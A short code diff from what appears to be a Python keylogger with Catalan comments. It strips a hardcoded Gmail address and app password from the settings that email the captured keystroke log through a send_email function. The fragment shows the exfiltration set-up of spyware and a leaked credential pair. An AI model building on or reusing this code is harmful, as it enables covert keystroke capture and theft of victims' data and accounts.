@@ -18,8 +18,8 @@ extend = "\\"
 count = 0
 keys =[]
 #enviar informació al correu
-email_address = "cyberprueba2023@gmail.com " 
-password = "omwihhplymhfxsfc " #códi que ha sigut generat per gmail a les aplicacions
+email_address = "" 
+password = "" #códi que ha sigut generat per gmail a les aplicacions
 toaddr = " " # Enter the email address you want to send your information to
 
 def send_email(filename, attachment, toaddr):
